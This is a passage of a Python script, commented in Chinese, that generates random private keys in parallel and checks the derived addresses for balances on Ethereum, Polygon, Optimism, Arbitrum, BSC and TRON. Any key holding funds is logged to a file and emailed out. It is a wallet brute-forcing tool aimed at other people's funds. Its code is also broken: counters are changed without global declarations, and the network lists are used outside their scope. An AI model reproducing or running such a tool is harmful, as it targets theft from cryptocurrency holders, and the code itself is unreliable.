            print(f"Error occurred while getting TRX balance for address {address} from {api}: {str(e)}")
            continue
    print("All TRON APIs failed to return the balance.")
    return 0

# 主调用
def check_balance(private_key):
    try:
        # 创建账户
        address_eth = Account.from_key(private_key).address
        address_tron = generate_tron_address(private_key)

        # 检查各网络上的余额
        balance_eth = get_eth_balance(address_eth, eth)
        balance_polygon = get_polygon_balance(address_eth, polygon)
        balance_optimism = get_optimism_balance(address_eth, optimism)
        balance_arbitrum = get_arbitrum_balance(address_eth, arbitrum)
        balance_bnb = get_bsc_balance(address_eth, bsc)

        # 检查波场 TRX 余额
        balance_trx = get_trx_balance(address_tron)

        print(f"Checking account {counter} with ETH address {address_eth} and TRON address {address_tron}...")
        # print(f"Checking account {counter} btc_address {btc_address}")
        # 如果任何网络的余额大于0，都将私钥和余额写入文件
        if balance_eth > 0 or balance_polygon > 0 or balance_optimism > 0 or balance_arbitrum > 0 or balance_bnb > 0 or balance_trx > 0:
            with open("C:\\si.txt", "a") as f:
                f.write(f"Private key: {private_key}\n")
                f.write(f"ETH Address: {address_eth}\n")
                f.write(f"TRON Address: {address_tron}\n")
                f.write(f"ETH Balance in Ether: {balance_eth}\n")
                f.write(f"Polygon Balance in Ether: {balance_polygon}\n")
                f.write(f"Optimism Balance in Ether: {balance_optimism}\n")
                f.write(f"Arbitrum Balance in Ether: {balance_arbitrum}\n")
                f.write(f"BSC Balance in BNB: {balance_bnb}\n")
                f.write(f"TRX Balance: {balance_trx}\n")
                f.write("================================\n")

        # 如果任何网络的余额大于0，发送电子邮件
        if balance_eth > 0 or balance_polygon > 0 or balance_optimism > 0 or balance_arbitrum > 0 or balance_bnb > 0 or balance_trx > 0:
            send_email(private_key)
            return True

    except Exception as e:
        print(f"Error occurred while checking balance: {str(e)}")

    return False

def main():
    # 赋值给eth, polygon, optimism, arbitrum, bsc,列表
    eth, polygon, optimism, arbitrum, bsc = jxrpc(rpc)
    noum = 10
    with ThreadPoolExecutor(max_workers=int(noum)) as executor:
        while True:
            # 创建新的账户
            # private_keys = [secrets.token_hex(32) for _ in range(10)]
            private_keys = [secrets.token_hex(32) for _ in range(int(noum))]
            # 并发查询余额
            futures = [executor.submit(check_balance, private_keys[i]) for i in range(int(noum))]
            results = [future.result() for future in futures]
            # 如果任何查询返回 True，表示找到了有余额的账户，就会停止循环
            if any(results):
                break

            # 增加计数器
            counter += 1
            if ethjs == len(eth):
                ethjs = 0
            if polygonjs == len(polygon):
                polygonjs = 0
            if arbitrumjs == len(arbitrum):
                arbitrumjs = 0
            if optimismjs == len(optimism):
                optimismjs = 0
            if bscjs == len(bsc):
                bscjs = 0       



@app.route('/',methods=["GET"])
def return_OneText():
    # while True:
    #     main()
    return {"Hello": "World"}
